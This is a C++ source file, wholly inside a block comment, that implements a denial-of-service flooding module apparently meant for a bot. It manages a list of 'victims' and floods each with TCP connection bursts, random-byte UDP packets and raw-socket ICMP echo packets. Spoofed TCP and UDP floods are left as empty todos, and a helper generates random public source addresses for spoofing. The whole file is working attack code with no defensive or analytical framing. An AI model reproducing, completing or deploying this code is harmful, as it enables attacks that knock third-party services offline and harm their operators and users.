/*#include <winsock2.h>
#include "ddos.h"

DDoS::DDoS(){
	Active = FALSE;
	StartThread();
}

VOID DDoS::AddVictim(PCHAR Host, USHORT Port, DWORD Flags, DWORD Amount, DWORD Delay, DWORD Time){
	DDoSVictim Temp;
	strncpy(Temp.Host, Host, sizeof(Temp.Host));
	Temp.Port = Port;
	Temp.Flags = Flags;
	if(Amount < 1)
		Amount = 1;
	Temp.Amount = Amount;
	if(Delay < 50)
		Delay = 50;
	Temp.Delay = Delay;
	Temp.Connected = FALSE;
	Temp.Socket.Create(SOCK_STREAM);
	Temp.Socket.BlockingMode(NONBLOCKING);
	Temp.Timeout.SetTimeout(Time * 1000);
	Temp.Timeout.Reset();
	Mutex.WaitForAccess();
	VictimList.push_back(Temp);
	Mutex.Release();
	Active = TRUE;
}

VOID DDoS::ClearVictimList(VOID){
	Mutex.WaitForAccess();
	VictimList.clear();
	Active = FALSE;
	Mutex.Release();
}

VOID DDoS::RemoveVictim(UINT Index){
	Mutex.WaitForAccess();
	VictimList.erase(VictimList.begin() + Index);
	Mutex.Release();
}

VOID DDoS::ThreadFunc(VOID){
	while(1){
		while(!Active)
			Sleep(1000);
		for(UINT i = 0; i < VictimList.size(); i++){
			Mutex.WaitForAccess();
			if(VictimList.size() <= i){
				Mutex.Release();
				break;
			}
			DDoSVictim CurrentVictim = VictimList[i];
			Mutex.Release();
			if(CurrentVictim.Timeout.TimedOut()){
				RemoveVictim(i);
				continue;
			}
			//dprintf("ddosing %s\r\n", CurrentVictim.Host);
			USHORT Port = CurrentVictim.Port;
			UINT TotalMethods = 0;
			if(CurrentVictim.Flags & DDOS_TCP)
				TotalMethods++;
			if(CurrentVictim.Flags & DDOS_UDP)
				TotalMethods++;
			if(CurrentVictim.Flags & DDOS_ICMP)
				TotalMethods++;
			if(CurrentVictim.Flags & DDOS_TCP_SPOOF)
				TotalMethods++;
			if(CurrentVictim.Flags & DDOS_UDP_SPOOF)
				TotalMethods++;
			if(CurrentVictim.Flags & DDOS_HTTP)
				TotalMethods++;
			if(TotalMethods == 0){
				Sleep(50);
				continue;
			}
			UINT AmountEach = (((FLOAT)CurrentVictim.Amount / TotalMethods) + 0.99f);
			if(Port == 0)
				Port = rand_r(1, 65535);
			if(CurrentVictim.Flags & DDOS_TCP){
				for(UINT f = 0; f < AmountEach; f++){
					Socket Sock;
					Sock.Create(SOCK_STREAM);
					Sock.BlockingMode(NONBLOCKING);
					Sock.Connect(CurrentVictim.Host, Port);
					Sock.Disconnect(CLOSE_BOTH_HDL);
				}
			}
			if(CurrentVictim.Flags & DDOS_UDP){
				for(UINT f = 0; f < AmountEach; f++){
					Socket Sock;
					Sock.Create(SOCK_DGRAM);
					CHAR Buffer[1024];
					for(UINT g = 0; g < sizeof(Buffer); g++)
						Buffer[g] = rand_r(0, 0xFF);
					sockaddr_in SockAddr;
					Sock.FillAddrStruct(&SockAddr, CurrentVictim.Host, Port);
					INT S = Sock.SendTo(Buffer, rand_r(0, sizeof(Buffer)), (sockaddr *)&SockAddr, sizeof(SockAddr));
					Sock.Disconnect(CLOSE_BOTH_HDL);
				}
			}
			if(CurrentVictim.Flags & DDOS_ICMP){
				for(UINT f = 0; f < AmountEach; f++){
					SOCKET Sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
					sockaddr_in Target;
					Target.sin_family = AF_INET;
					Target.sin_port = 0;
					Target.sin_addr.s_addr = SocketFunction::GetAddr(CurrentVictim.Host);

					UINT MsgSize = rand_r(1, 1024 - sizeof(ICMPHeader));
					USHORT TotalSize = sizeof(ICMPHeader) + MsgSize;
					BYTE Data[1024];
					memset(Data, 0, sizeof(Data));

					ICMPHeader* ICMPH = (ICMPHeader*)(PBYTE(Data));
					ICMPH->Type = 8;
					ICMPH->Code = 0;
					ICMPH->Checksum = 0;
					ICMPH->ID = rand_r(0, 0xFFFF);
					ICMPH->Sequence = 0;
					
					for(UINT i = sizeof(ICMPHeader); i < sizeof(ICMPHeader) + MsgSize; i++){
						Data[i] = rand_r(0, 0xFF);
					}

					ICMPH->Checksum = SocketFunction::Checksum((PUSHORT)ICMPH, sizeof(ICMPHeader) + MsgSize);

					INT H = sendto(Sock, (PCHAR)Data, sizeof(ICMPHeader) + MsgSize, 0, (sockaddr*)&Target, sizeof(Target));

					closesocket(Sock);
				}
			}
			if(CurrentVictim.Flags & DDOS_TCP_SPOOF){ // todo
				for(UINT f = 0; f < AmountEach; f++){

				}
			}
			if(CurrentVictim.Flags & DDOS_UDP_SPOOF){ // todo
				for(UINT f = 0; f < AmountEach; f++){

				}
			}
			Sleep(CurrentVictim.Delay);
		}
	}
}

ULONG DDoS::GenerateSourceAddress(VOID){
	ULONG Addr;
	while(1){
		Addr = rand_r(0, 0xFFFFFFFF);
		PBYTE P = (PBYTE)&Addr;
		if(P[0] == 10 || P[0] == 192 && P[1] == 168 || P[0] == 172 && P[1] >= 16 && P[1] < 32 || P[0] == 0 || P[3] == 0) ;
		else
			break;
	}
	return Addr;
}*/